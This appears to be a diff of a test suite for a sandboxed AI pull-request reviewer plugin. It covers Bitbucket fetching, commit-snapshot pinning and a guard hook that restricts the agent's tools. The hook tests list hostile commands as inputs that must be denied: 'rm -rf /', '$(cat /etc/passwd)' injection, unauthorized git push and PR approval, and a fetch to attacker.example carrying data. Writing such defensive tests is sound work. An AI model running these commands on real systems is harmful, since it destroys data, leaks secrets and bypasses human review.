@@ -19,6 +19,7 @@ import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpath
 import { tmpdir } from "os";
 import { join, dirname } from "path";
 import * as BB from "./bitbucket-pr.ts";
+import * as PS from "./pr-source.ts";
 
 const HERE = import.meta.dirname ?? __dirname;
 const REPO_ROOT = dirname(HERE);
@@ -62,7 +63,8 @@ function handler(req: IncomingMessage, res: ServerResponse, base: string): void 
   if (status === 5032) return void res.writeHead(503).end();
   if (typeof status === "number" && status !== 503) return void res.writeHead(status).end("{}");
   const R = "/2.0/repositories/onoapps/yes-tv";
-  if (p === `${R}/pullrequests/42`) return json({ id: 42, title: "Login with one-time code", state: "OPEN", author: { display_name: "Dana" }, description: DESCRIPTION, source: { branch: { name: "feature/login" }, commit: { hash: "a".repeat(40) } }, destination: { branch: { name: "develop" }, commit: { hash: "b".repeat(40) } } });
+  // mode.moving: the author pushes after the first metadata read (Bitbucket abbreviates hashes to 12).
+  if (p === `${R}/pullrequests/42`) return json({ id: 42, title: "Login with one-time code", state: "OPEN", author: { display_name: "Dana" }, description: DESCRIPTION, source: { branch: { name: "feature/login" }, commit: { hash: mode.moving && hits[p] >= 2 ? "d".repeat(12) : mode.short ? "a".repeat(12) : "a".repeat(40) } }, destination: { branch: { name: "develop" }, commit: { hash: "b".repeat(40) } } });
   if (p === `${R}/pullrequests/42/diffstat`) return void res.writeHead(302, { location: `${base}${R}/diffstat/${"a".repeat(12)}..${"b".repeat(12)}` }).end();
   if (p.startsWith(`${R}/diffstat/`)) {
     const page = Number(url.searchParams.get("page") ?? "1");
@@ -109,7 +111,8 @@ function hook(payload: unknown, env: Record<string, string> = {}) {
 }
 const AGENT = "ono-mobile-dev-plugin:pr-reviewer";
 const call = (tool: string, input: Record<string, unknown> = {}, agent: string | null = AGENT) => ({ tool_name: tool, tool_input: input, session_id: "s", cwd: TMP, ...(agent ? { agent_type: agent } : {}) });
-const HELPER = `node --no-warnings "${REPO_ROOT}/scripts/bitbucket-pr.ts"`;
+const HELPER = `node --no-warnings "${REPO_ROOT}/scripts/pr-source.ts"`;
+const OLD_HELPER = `node --no-warnings "${REPO_ROOT}/scripts/bitbucket-pr.ts"`;
 
 async function main(): Promise<void> {
   // 1. Retrieval, against the fake Bitbucket.
@@ -153,7 +156,8 @@ async function main(): Promise<void> {
     check("rate limit: 429 stops at once, reporting the headers, with no retry", rl.outcome === "BB_RATE_LIMITED" && rl.rate_limit?.["x-ratelimit-limit"] === "1000" && rl.rate_limit?.["retry-after"] === "60" && hits[R] === 1, JSON.stringify(rl));
     mode = { [R]: 503 };
     hits = {};
-    check("5xx: one retry, then success", (await BB.fetchPr(PR, { env })).ok === true && hits[R] === 2);
+    // Two requests for the first metadata read (503, then the one retry), one for the snapshot's closing read.
+    check("5xx: one retry, then success", (await BB.fetchPr(PR, { env })).ok === true && hits[R] === 3);
     mode = { [R]: 5032 };
     hits = {};
     const down = await BB.fetchPr(PR, { env });
@@ -190,6 +194,31 @@ async function main(): Promise<void> {
     const cross = await BB.fetchPr(PR, { env });
     check("redirect: to another host is refused — the credential is never sent there", cross.outcome === "BB_REDIRECT_REFUSED", JSON.stringify(cross));
     mode = {};
+
+    // Snapshot (integration remediation): the revision is pinned for the whole review.
+    hits = {};
+    mode = { moving: true };
+    const moved = await BB.fetchPr(PR, { env });
+    check("snapshot: a push while the PR is read stops the fetch (BB_PR_MOVED), staging nothing", moved.ok === false && moved.outcome === "BB_PR_MOVED" && moved.before.source === "a".repeat(40) && moved.after.source === "d".repeat(12), JSON.stringify(moved));
+    mode = { short: true };
+    check("snapshot: an abbreviated hash is the same commit (no false move)", (await BB.fetchPr(PR, { env })).ok === true && BB.sameCommit("a".repeat(12), "a".repeat(40)) && !BB.sameCommit("a".repeat(12), "d".repeat(40)) && !BB.sameCommit(null, "a".repeat(40)));
+    mode = {};
+    const viaPs = await PS.fetch(PR, { env });
+    check("pr-source: Bitbucket through the dispatcher — PR_FETCHED with the snapshot", viaPs.ok === true && viaPs.outcome === "PR_FETCHED" && viaPs.provider === "bitbucket" && viaPs.provider_outcome === "BB_PR_FETCHED" && viaPs.snapshot.head_commit === "a".repeat(40) && viaPs.snapshot.base_commit === "b".repeat(40) && viaPs.snapshot.repository === "onoapps/yes-tv");
+    hits = {};
+    const pinned = await PS.file(PR, "src/f1.ts", viaPs.snapshot.head_commit, { env });
+    check("pr-source: a Bitbucket file read is pinned to the snapshot commit — no metadata lookup of the latest head", pinned.ok === true && pinned.commit === "a".repeat(40) && pinned.outcome === "PR_FILE" && !hits["/2.0/repositories/onoapps/yes-tv/pullrequests/42"]);
+    check("pr-source: a Bitbucket file read without a commit is refused", (await PS.file(PR, "src/f1.ts", undefined, { env })).outcome === "PR_COMMIT_REQUIRED");
+    check("pr-source: the Bitbucket base side at the snapshot's base commit", (await PS.file(PR, "src/f1.ts", viaPs.snapshot.base_commit, { env })).commit === "b".repeat(40));
+    check("pr-source: Bitbucket head unchanged", (await PS.head(PR, viaPs.snapshot.head_commit, { env })).outcome === "PR_HEAD_UNCHANGED");
+    mode = { moving: true };
+    hits = { "/2.0/repositories/onoapps/yes-tv/pullrequests/42": 5 };
+    const ch = await PS.head(PR, viaPs.snapshot.head_commit, { env });
+    check("pr-source: Bitbucket head changed after the review started — reported with both commits", ch.outcome === "PR_HEAD_CHANGED" && ch.reviewed_commit === "a".repeat(40) && ch.current_commit === "d".repeat(12) && /run \/review-pr again/.test(ch.message));
+    mode = {};
+    check("pr-source: cleanup", PS.cleanup(viaPs.staging_dir, env).outcome === "PR_STAGING_REMOVED");
+    const prHeadAuth = await BB.prHead(PR, { env: { ...env, BITBUCKET_API_TOKEN: "" } });
+    check("prHead: no token → BB_AUTH_MISSING before any request", prHeadAuth.outcome === "BB_AUTH_MISSING");
 
     // The CLI, as the agent runs it: stdout and stderr never carry the credential.
     const out = await new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve) => {
@@ -238,12 +267,15 @@ async function main(): Promise<void> {
   // 4. The guard hook.
   {
     for (const t of ["Write", "Edit", "MultiEdit", "NotebookEdit", "Agent", "Task"]) check(`hook: ${t} is denied inside the reviewer`, hook(call(t, { file_path: "/x" })).decision === "deny");
-    for (const c of ["git push origin HEAD", "git commit -am x", "curl -X POST https://api.bitbucket.org/2.0/repositories/a/b/pullrequests/1/approve", `${HELPER} fetch ${PR}; git push`, `${HELPER} fetch ${PR} && rm -rf /`, `${HELPER} fetch $(cat /etc/passwd)`, `${HELPER} fetch ${PR} > /tmp/x`, `node --no-warnings "${REPO_ROOT}/scripts/task-state.ts" write`, "rm -rf .", `${HELPER} fetch ${PR}\ngit push`]) {
+    for (const c of [`${OLD_HELPER} fetch ${PR}`, `${OLD_HELPER} file ${PR} --path src/a.ts`, "gh pr review 12 --approve", "gh api -X POST repos/o/r/pulls/12/reviews", "gh pr checkout 12", "git fetch origin pull/12/head", "git push origin HEAD", "git commit -am x", "curl -X POST https://api.bitbucket.org/2.0/repositories/a/b/pullrequests/1/approve", `${HELPER} fetch ${PR}; git push`, `${HELPER} fetch ${PR} && rm -rf /`, `${HELPER} fetch $(cat /etc/passwd)`, `${HELPER} fetch ${PR} > /tmp/x`, `node --no-warnings "${REPO_ROOT}/scripts/task-state.ts" write`, "rm -rf .", `${HELPER} fetch ${PR}\ngit push`]) {
       check(`hook: denied in the reviewer — ${c.slice(0, 60).replace(REPO_ROOT, "<root>")}`, hook(call("Bash", { command: c })).decision === "deny");
     }
     check("hook: the helper's fetch is allowed", hook(call("Bash", { command: `${HELPER} fetch ${PR}` })).out === "");
     check("hook: the helper's cleanup is allowed", hook(call("Bash", { command: `${HELPER} cleanup /tmp/ono-review-pr-abc` })).out === "");
-    check("hook: the helper's file read is allowed", hook(call("Bash", { command: `${HELPER} file ${PR} --path src/a.ts --side destination` })).out === "");
+    check("hook: the helper's file read is allowed", hook(call("Bash", { command: `${HELPER} file ${PR} --path src/a.ts --commit ${"a".repeat(40)}` })).out === "");
+    check("hook: the helper's head check is allowed", hook(call("Bash", { command: `${HELPER} head ${PR} --expect ${"a".repeat(40)}` })).out === "");
+    check("hook: a GitHub PR through the helper is allowed", hook(call("Bash", { command: `${HELPER} fetch https://github.com/o/r/pull/12` })).out === "");
+    check("hook: the helper's parse verb is not needed by the reviewer and is denied", hook(call("Bash", { command: `${HELPER} parse ${PR}` })).decision === "deny");
     check("hook: the Node.js preflight is allowed", hook(call("Bash", { command: `node "${REPO_ROOT}/scripts/node-preflight.mjs"` })).out === "");
     // M3: no general network tool inside the reviewer; normal local reads stay available.
     for (const t of ["WebFetch", "WebSearch"]) check(`hook: ${t} is denied inside the reviewer (M3)`, hook(call(t, { url: "https://attacker.example/?d=x" })).decision === "deny");
@@ -258,9 +290,24 @@ async function main(): Promise<void> {
     check("hook: the bare agent name is the reviewer too", hook(call("Write", { file_path: "/x" }, "pr-reviewer")).decision === "deny");
     check("hook: another agent is untouched", hook(call("Bash", { command: "git push" }, "ono-mobile-dev-plugin:code-reviewer")).out === "");
     check("hook: the main session is untouched", hook(call("Write", { file_path: "/x" }, null)).out === "");
-    const noJq = `${dirname(process.execPath)}:/nonexistent-bin`;
-    check("hook: without jq, the reviewer fails closed", spawnSync("/bin/bash", [HOOK], { input: JSON.stringify(call("Bash", { command: `${HELPER} fetch ${PR}` })), encoding: "utf-8", env: { PATH: noJq, CLAUDE_PLUGIN_ROOT: REPO_ROOT } }).stdout.includes('"deny"'));
-    check("hook: without jq, other calls pass through", spawnSync("/bin/bash", [HOOK], { input: JSON.stringify(call("Write", { file_path: "/x" }, null)), encoding: "utf-8", env: { PATH: noJq, CLAUDE_PLUGIN_ROOT: REPO_ROOT } }).stdout === "");
+    // A1: without jq, Node.js reads the call — the same decisions; with neither, the reviewer fails closed.
+    const nodeOnly = `${dirname(process.execPath)}:/nonexistent-bin`;
+    const bare = (payload: unknown, path: string) => {
+      const p = spawnSync("/bin/bash", [HOOK], { input: JSON.stringify(payload), encoding: "utf-8", env: { PATH: path, CLAUDE_PLUGIN_ROOT: REPO_ROOT } });
+      return p.stdout;
+    };
+    check("hook: the no-jq PATH really has no jq", spawnSync("/bin/bash", ["-c", "command -v jq"], { env: { PATH: nodeOnly } }).status !== 0);
+    check("hook: without jq (Node.js reads it), the helper is still allowed", bare(call("Bash", { command: `${HELPER} fetch ${PR}` }), nodeOnly) === "");
+    check("hook: without jq (Node.js reads it), a write is still denied", bare(call("Write", { file_path: "/x" }), nodeOnly).includes('"deny"'));
+    check("hook: without jq (Node.js reads it), git push is still denied", bare(call("Bash", { command: "git push" }), nodeOnly).includes('"deny"'));
+    check("hook: without jq (Node.js reads it), other calls pass through", bare(call("Write", { file_path: "/x" }, null), nodeOnly) === "");
+    const neither = "/nonexistent-bin";
+    const nn = bare(call("Bash", { command: `${HELPER} fetch ${PR}` }), neither);
+    check("hook: with neither jq nor Node.js, the reviewer fails closed with the install hint", nn.includes('"deny"') && /winget install jqlang\.jq/.test(nn), nn);
+    check("hook: with neither, other calls pass through", bare(call("Write", { file_path: "/x" }, null), neither) === "");
+    const garbled = spawnSync("/bin/bash", [HOOK], { input: '{"agent_type": "pr-reviewer", "tool_name": ', encoding: "utf-8", env: { PATH: nodeOnly, CLAUDE_PLUGIN_ROOT: REPO_ROOT } }).stdout;
+    check("hook: a malformed payload naming the reviewer is denied (Node.js reader)", garbled.includes('"deny"'));
+    check("hook: a deny reason is valid JSON whatever it contains", JSON.parse(hook(call("mcp__x__\"evil\\name")).out).hookSpecificOutput.permissionDecision === "deny");
     const cfg = JSON.parse(read("hooks/review-pr-guard.json"));
     check("hook: registered for every tool, through plugin.json", cfg.hooks.PreToolUse[0].matcher === "*" && JSON.parse(read(".claude-plugin/plugin.json")).hooks.includes("./hooks/review-pr-guard.json"));
   }
@@ -278,11 +325,11 @@ async function main(): Promise<void> {
     check("agent: its MCP tools are reads only", tools.filter((t) => t.startsWith("mcp__")).every((t) => /__(get_design_context|get_screenshot|get_metadata|getConfluenceContent|getJiraIssue)$/.test(t)));
     const cmd = read("commands/review-pr.md");
     check("command: runs forked in the pr-reviewer agent, with writing tools removed", /^context: fork$/m.test(cmd) && /^agent: pr-reviewer$/m.test(cmd) && /^disallowed-tools: Write, Edit, MultiEdit, NotebookEdit, WebFetch, WebSearch$/m.test(cmd));
-    check("command: retrieves through the helper only", cmd.includes('scripts/bitbucket-pr.ts" fetch') && cmd.includes('scripts/bitbucket-pr.ts" file'));
+    check("command: retrieves through the provider-neutral helper only", cmd.includes('scripts/pr-source.ts" fetch') && cmd.includes('scripts/pr-source.ts" file') && !cmd.includes("scripts/bitbucket-pr.ts"));
     check("command (m3): incomplete coverage is reported, never full coverage", /diffstat_complete/.test(cmd) && /more files may exist that were not reviewed/.test(cmd) && /never report full coverage/.test(cmd));
-    check("command (m4): the staging directory is removed after the report", cmd.includes('scripts/bitbucket-pr.ts" cleanup <staging_dir>'));
+    check("command (m4): the staging directory is removed after the report", cmd.includes('scripts/pr-source.ts" cleanup <staging_dir>'));
     check("command: never asks for or echoes a token", /Never ask for the token in the chat/.test(cmd));
-    check("command: the report's sections", ["### Blocking", "### Major", "### Minor suggestions", "### Missing tests", "### Potential regressions", "### Unverified concerns", "### Unverified assumptions", "**Files reviewed**", "**Specification and design accessed**"].every((s) => cmd.includes(s)));
+    check("command: the report's sections", ["### Blocking", "### Major", "### Minor", "### Missing tests", "### Potential regressions", "### Unverified concerns", "### Unverified assumptions", "**Files reviewed**", "**Specification and design accessed**"].every((s) => cmd.includes(s)));
     check("command: never claims tests ran", cmd.includes("No tests were executed by this review.") && /Never say a test passed, failed or ran/.test(cmd));
     check("command: no claim about a design or spec that was not read", /Never claim the UI matches a design, or the code matches a specification, that was not read/.test(cmd));
     check("command: the decision is the human's", /Decision: yours/.test(cmd));
